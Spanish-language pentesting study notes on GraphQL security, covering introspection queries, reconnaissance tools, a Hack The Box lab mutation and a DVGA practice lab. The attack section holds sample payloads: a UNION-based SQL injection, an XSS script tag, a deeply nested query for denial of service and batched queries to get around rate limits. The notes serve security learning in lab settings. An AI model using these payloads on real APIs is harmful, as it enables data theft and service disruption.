## Definición
GraphQL es un lenguaje de consultas para APIs y un sistema de ejecución de esas consultas en el servidor, donde **seleccionamos campos en objetos**.  Fue desarrollado originalmente por Facebook como alternativa a determinados problemas que encontraban utilizando APIs REST. 

Un servidor API REST normalmente expone diferentes endpoints para diferentes servicios mientras que un GraphQL expone un único endpoint y el cliente indica la información que necesita (puede hacer peticiones tipo consulta de datos: `Query` , modificación: `Mutation` y actualizaciones cuando ocurren determinados eventos: `Subscription`)

Está situado entre el cliente y otras fuentes de datos (postgreSQL/MySQL, MongoDB, otros servicios y APIs,...)

La forma de realizar las consultas puede ser similar a la siguiente
```javascript
{
  users(username: "admin") {
    id
    username
    role
  }
}
```
Normalmente, se enviaría una petición mediante una petición HTTP:
```http
POST /graphql HTTP/1.1
Host: lab.local
Content-Type: application/json

{
  "query": "{ users(username: \"admin\") { id username role } }"
}
```
Recibiendo una respuesta como la que sigue: 
```json
{
  "data": {
    "users": [
      {
        "id": "1",
        "username": "admin",
        "role": "admin"
      }
    ]
  }
}
```
Una API GraphQL se construye definiendo un **schema**, que especifica los tipos de datos y las operaciones disponibles, y unos **resolvers**, que implementan la lógica necesaria para obtener o modificar los datos. El schema es el contrato de la API; los resolvers son su implementación.
El esquema se escribe utilizando un lenguaje llamado SDL (Schema Definition Language), que permite definir qué datos y operaciones ofrece la API. 
- Ejemplo de definición de tipo de dato u objeto (estructura que GraphQL permite consultar):
	```javascript
	type User {
	  id: ID!
	  username: String!
	  role: String!
	  email: String
	}
	```
- Ejemplo de definición de operaciones disponibles
	```javascript
	type Query {
	  users(username: String): [User!]!
	}
	```
El schema define qué operaciones y campos existen, pero no determina por sí solo quién puede utilizarlos. Los resolvers y la lógica del backend deben implementar los controles de autorización correspondientes.

Por ejemplo, que exista el campo `password` dentro del tipo `User` no significa que un usuario deba poder consultarlo.
## Enumeración y reconocimiento GraphQL

La **introspection** permite consultar el esquema de una API GraphQL para descubrir operaciones, argumentos, tipos de objeto y sus campos.

**Metodología:**
1. Identificar el endpoint GraphQL (`/graphql`, `/api/graphql`, etc.).
2. Ejecutar una introspection completa y, si es posible, visualizar el esquema con **GraphQL Voyager**.
3. Identificar los puntos de entrada (`Query` y `Mutation`), sus argumentos y tipos de retorno.
4. Construir consultas utilizando los campos de los objetos descubiertos.

### Chuleta de introspection

| Objetivo                                           | Consulta GraphQL                                                                                                                               |
| -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| Enumerar operaciones de lectura                    | `{ __schema { queryType { fields { name } } } }`                                                                                               |
| Enumerar mutations                                 | `{ __schema { mutationType { fields { name } } } }`                                                                                            |
| Enumerar tipos disponibles                         | `{ __schema { types { name kind } } }`                                                                                                         |
| Inspeccionar un objeto (`OBJECT`)                  | `{ __type(name: "UserObject") { fields { name type { name kind ofType { name kind } } } } }`                                                   |
| Inspeccionar un objeto de entrada (`INPUT_OBJECT`) | `{ __type(name: "RegisterUserInput") { inputFields { name type { name kind ofType { name kind } } } } }`                                       |
| Enumerar argumentos y retornos de queries          | `{ __schema { queryType { fields { name args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }` |

**Conceptos clave:**

- `Query` / `Mutation`: tipos raíz que agrupan las operaciones de lectura y modificación.
    
- `OBJECT` / `fields`: objetos y campos que podemos consultar.
    
- `INPUT_OBJECT` / `inputFields`: estructura de los datos que podemos proporcionar a una operación.
    
- `args`: argumentos aceptados por una operación.
    
- `type` / `ofType`: permiten identificar los tipos y recorrer envoltorios como `LIST` y `NON_NULL`.
    

Los nombres `UserObject` y `RegisterUserInput` son ejemplos que deben sustituirse por los descubiertos en el esquema.

**Nota:** si introspection está habilitada, una consulta completa permite obtener prácticamente toda esta información. Las consultas de la tabla son alternativas para explorar elementos concretos manualmente.
## Herramientas para reconocimiento de GraphQL

| Herramienta                                                                     | Utilidad                                                                                                   |
| ------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| [graphw00f](https://github.com/dolevf/graphw00f)                                | Descubrir endpoints GraphQL e identificar el motor utilizado (Graphene, Apollo, etc.).                     |
| [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix) | Consultar las características de seguridad y posibles superficies de ataque de cada implementación.        |
| [GraphQL Voyager](https://github.com/APIs-guru/graphql-voyager)                 | Visualizar gráficamente el esquema obtenido mediante introspection, incluyendo tipos, campos y relaciones. |
| [InQL](https://github.com/doyensec/inql)                                        | Extensión de Burp Suite para facilitar la enumeración y las pruebas de seguridad de APIs GraphQL.          |
| [GraphiQL](https://github.com/graphql/graphiql)                                 | Interfaz interactiva para ejecutar consultas GraphQL. Puede estar expuesta por la propia aplicación.       |

### graphw00f — Fingerprinting

```bash
git clone https://github.com/dolevf/graphw00f.git
cd graphw00f

python3 -m pip install requests
python3 main.py -d -f -t http://TARGET
```

- `-d`: detecta el endpoint GraphQL.
- `-f`: identifica el motor GraphQL.
- `-t`: especifica la URL objetivo.
    

### GraphQL Voyager — Visualización

1. Obtener el esquema mediante una consulta de introspection completa. Podemos encontrar consultas de introspección completas [aquí](https://gatographql.com/guides/intro/what-is-schema-introspection o desde GraphQL Voyager seleccionando CHANGE SCHEMA → INTROSPECTION y copiando la query
2. Importar la respuesta JSON en GraphQL Voyager.
3. Explorar visualmente los tipos, campos, relaciones y operaciones.
**Nota:** utilizar una instancia local para no enviar información del esquema a servicios externos.

Otra forma interesante de trabajar con la consulta de introspección, es copiarla a un archivo, p. ej: `introspection.grahpql`,  y utilizar (quizás conviene añadir cabeceras  si el endpoint requiere autenticación): 

```bash
jq -Rs '{query: .}' introspection.graphql > payload.json

curl -s http://TARGET/graphql \
  -H 'Content-Type: application/json' \
  --data-binary @payload.json \
  > schema.json

# Ejemplo de petición real
curl --path-as-is -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Priority: u=4'  \
    -b $'session=eyJyb2xlIjoidXNlciIsInVzZXIiOiJodGItc3RkbnQifQ.auDhTA.ds3uLQPjnhmv3-mChdWoUquQnTg' \
    --data-binary @payload.json  \
    $'http://154.57.164.71:32810/graphql'
```
### Laboratorio de práctica — DVGA

[Damn Vulnerable GraphQL Application (DVGA)](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application) es una aplicación deliberadamente vulnerable para practicar reconocimiento, introspection, inyecciones, errores de autorización y otras vulnerabilidades GraphQL.

```
docker run --rm -p 127.0.0.1:5013:5013 \
  -e WEB_HOST=0.0.0.0 dolevf/dvga
```

Acceso: `http://localhost:5013`
## Ataques de inyección
### SQLi
Dado que es muy común que haya una base de datos SQL sobre la que se ejecuten las consultas internamente, tiene sentido intentar una inyección SQL, por ejemplo en un filtro de la query como la que sigue: 
```json
{ user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") { username } }
```

### XSS
Del mismo modo, podemos intentar similares a la que sigue para intentar una inyección XSS:
```json
{post(id: "<script>alert(1)</script>" ) { id title body category author { username }}}
```
## DoS & Batching Attacks (ataques por lotes)
### DoS
Se pueden ejecutar cuando identificamos una estructura repetitiva entre distintos objetos, como podemos observar en la imagen que hay a continuación entre `UserObject` y `PostObject`
![[Pasted image 20261028180408.png]]

Ejemplo: 
```json
{ posts { author { posts { edges { node { author { username{posts {edges  ...} } } } } } } } }
```
### Ataques por lotes
Implica hacer varias peticiones al mismo tiempo en una misma consulta, por ejemplo: 
```json
[ { "query":"{user(username: \"admin\") {uuid}}" }, { "query":"{post(id: 1) {title}}" } ]
```
Aunque no suponga un problema de seguridad en sí, puede servir para bypasear bloqueos cuando solo se nos permite realizar un número concreto de operaciones por tieimpmo. 
## Mutations

Las **mutations** permiten crear, modificar o eliminar datos en el servidor. En `/opt/grahpql/payloads` tenemos las mutaciones que se citan aquí, que no se ponen por ahorrar contenido. 
### Enumeración y construcción de mutations
1. **Enumerar mutations y sus argumentos:** ejecutar `introspection-mutation.graphql` para descubrir las operaciones disponibles, sus parámetros, tipos y valores de retorno.
2. **Inspeccionar objetos de entrada:** cuando un argumento sea de tipo `INPUT_OBJECT`, utilizar `introspection-input.graphql`, sustituyendo el nombre del tipo descubierto. Esto permite conocer sus campos mediante `inputFields`.
3. **Inspeccionar tipos de retorno:** utilizar `__type(name: "...")` para descubrir los campos que puede devolver la operación.
4. **Construir y ejecutar la mutation** con la información obtenida. Sintaxis genérica:
	```json
	mutation {
	  operationName(input: {
	    field1: "value1"
	    field2: "value2"
	  }) {
	    resultField
	  }
	}
	```
### Ejemplo de HTB — Registro de usuarios

**1. Enumerar mutations:** mediante `introspection-mutation.graphql` descubrimos:
- Operación: `registerUser`
- Argumento: `input`
- Tipo del argumento: `RegisterUserInput`
- Tipo de retorno: `RegisterUser`
**2. Inspeccionar el objeto de entrada:** utilizando `introspection-input.graphql` con `RegisterUserInput`, descubrimos los campos:`username`, `password`, `role`, `msg`.
**3. Inspeccionar el tipo de retorno:** consultamos los campos de `RegisterUser`:
```json
{
  __type(name: "RegisterUser") {
    fields {
      name
      type {
        name
        kind
        ofType {
          name
        }
      }
    }
  }
}
```

De esta forma identificamos el campo `user`, que devuelve un objeto `UserObject`, cuyos campos ya habíamos enumerado anteriormente.
**4. Construir y ejecutar la mutation:**
En este laboratorio, el campo `password` requiere un hash MD5:
```bash
echo -n 'password' | md5sum
```

```json
mutation {
  registerUser(input: {
    username: "test123"
    password: "5f4dcc3b5aa765d61d8327deb882cf99"
    role: "user"
    msg: "newUser"
  }) {
    user {
      username
      role
      msg
    }
  }
}
```

La mutation crea el usuario y devuelve los campos solicitados dentro de `user`.

**Nota:** `registerUser`, `input` y `user` son nombres definidos por el esquema de esta API, no palabras reservadas de GraphQL. En otros laboratorios pueden ser diferentes.
